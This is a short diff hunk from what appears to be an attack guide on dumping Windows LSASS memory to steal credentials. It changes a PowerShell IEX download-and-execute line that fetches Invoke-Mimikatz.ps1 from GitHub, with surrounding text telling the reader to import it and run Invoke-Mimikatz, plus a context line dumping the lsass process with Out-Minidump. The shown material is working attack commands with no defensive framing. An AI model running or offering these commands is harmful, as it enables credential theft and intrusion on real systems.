@@ -36,7 +36,7 @@ Get-Process lsass | Out-Minidump -DumpFilePath C:\Path\To\Dump
 Download & Import the Script:
 First, you need to get the Invoke-Mimikatz.ps1 script from the GitHub repository.
 If you're working directly on the machine:
-<code>IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/g4uss47/InvokeMimikatz/master/Invoke-Mimikatz.ps1')</code><br>
+<code>IEX (New-Object Net.WebClient).DownloadString('https://github.com/g4uss47/Invoke-Mimikatz/raw/master/Invoke-Mimikatz.ps1')</code><br>
 
 Invoke Mimikatz to Dump LSASS:<br>
 Once the module is imported, you can run Invoke-Mimikatz to dump the LSASS</br>
